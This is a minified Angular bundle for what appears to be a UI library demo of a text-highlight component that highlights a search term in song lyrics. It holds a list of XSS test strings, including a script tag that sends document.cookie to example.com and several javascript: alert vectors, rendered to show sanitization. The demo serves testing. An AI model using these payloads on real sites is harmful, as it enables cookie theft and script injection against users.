import{c as O}from"./chunk-Y3BRQJAY.js";import{g as L}from"./chunk-BCBJTPRO.js";import{a as D}from"./chunk-CJFOCIHU.js";import{c as C,g as y,k as v}from"./chunk-I5QGFHJG.js";import{k as b}from"./chunk-EHNCPSLF.js";import{Ac as E,Dc as H,Eb as u,Ec as S,Fc as M,Oc as h,Qb as a,Qc as m,Wb as s,Xb as l,Yb as r,fc as f,gc as T,hc as I,ib as p,nb as o,nc as F,yc as g,zb as _}from"./chunk-MC3BMXIX.js";function w(i,c){if(i&1&&(r(0,"p",5),h(1,"nuiHighlight")),i&2){let t=c.$implicit;a("innerHTML",m(1,1,t,t),p)}}function N(i,c){if(i&1&&(r(0,"p",5),h(1,"nuiHighlight")),i&2){let t=c.$implicit,n=F();a("innerHTML",m(1,1,t,n.search),p)}}var B=(()=>{class i{constructor(){this.contentString=$localize`
        Hello, it's me, I was wondering,<br>
        If after all these years you'd like to meet to go over everything,<br>
        They say that time's supposed to heal, yeah,<br>
        But I ain't done much healing,<br>
        <br>
        Hello, can you hear me?,<br>
        I'm in California dreaming about who we used to be,<br>
        When we were younger and free,<br>
        I've forgotten how it felt before the world fell at our feet,<br>
        <br>
        There's such a difference between us,<br>
        And a million miles,<br>
        <br>
        Hello from the other side,<br>
        I must've called a thousand times ,<br>
        To tell you I'm sorry, for everything that I've done,<br>
        But when I call you never seem to be home,<br>
        <br>
        Hello from the outside,<br>
        At least I can say that I've tried ,<br>
        To tell you I'm sorry, for breaking your heart,<br>
        But it don't matter, it clearly doesn't tear you apart anymore
    `,this.contentStringIgnore=$localize`
        Hello, can you hear me?,<br>
        I'm in California dreaming about who we used to be,<br>
        When we were younger and free,<br>
        I've forgotten how it felt before the world fell at our feet,
    `,this.xss=["http://localhost:4200/#/highlight",'><SCRIPT>var+img=new+Image();img.src="http://example.com/"%20+%20document.cookie;<\/SCRIPT>',"<div>inlinescript<SCRIPT>alert('XSS')<\/SCRIPT></div>",`<IMG SRC="javascript:alert('XSS');">`,"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",`<a onclick="alert('XSS')" class="someclass">xss anchor</a>`],this.search="c"}static{this.\u0275fac=function(n){return new(n||i)}}static{this.\u0275cmp=_({type:i,selectors:[["nui-highlight"]],standalone:!1,decls:25,vars:12,consts:()=>{let t;t=$localize`:␟220f75007b39241cb07366aa68b51ffb7d2731f6␟3166421379558502876:Search Term:`;let n;return n=$localize`:␟72eac312f0e0f1c263963c6fe556f4ec279d39ca␟8943076329770786823: Text below is piped via filter as well. But highlight doesn't appear. ${"\uFFFD#21\uFFFD\uFFFD/#21\uFFFD"}:LINE_BREAK: Class ${"\uFFFD#22\uFFFD"}:START_ITALIC_TEXT:nui-ignore-highlight${"\uFFFD/#22\uFFFD"}:CLOSE_ITALIC_TEXT: on container prevents it. `,[t,n,[3,"innerHTML",4,"ngFor","ngForOf"],["for","search"],["id","search",3,"ngModelChange","ngModel"],[3,"innerHTML"],[1,"nui-ignore-highlight"],[1,"nui-text-label"]]},template:function(n,e){n&1&&(s(0,"nui-example-wrapper")(1,"h3"),g(2,"XSS + self highlight"),l(),u(3,w,2,4,"p",2),r(4,"nui-divider"),s(5,"h3"),g(6,"XSS + search"),l(),s(7,"label",3),I(8,0),l(),r(9,"br"),s(10,"input",4),M("ngModelChange",function(d){return S(e.search,d)||(e.search=d),d}),l(),r(11,"br")(12,"nui-divider"),g(13),u(14,N,2,4,"p",2),r(15,"nui-divider")(16,"p",5),h(17,"nuiHighlight"),s(18,"section",6)(19,"p",7),f(20,1),r(21,"br")(22,"i"),T(),l(),r(23,"p",5),h(24,"nuiHighlight"),l()()),n&2&&(o(3),a("ngForOf",e.xss),o(7),H("ngModel",e.search),o(3),E(" search = ",e.search," "),o(),a("ngForOf",e.xss),o(2),a("innerHTML",m(17,6,e.contentString,e.search),p),o(7),a("innerHTML",m(24,9,e.contentStringIgnore,e.search),p))},dependencies:[D,C,y,v,b,L,O],encapsulation:2})}}return i})();export{B as a};
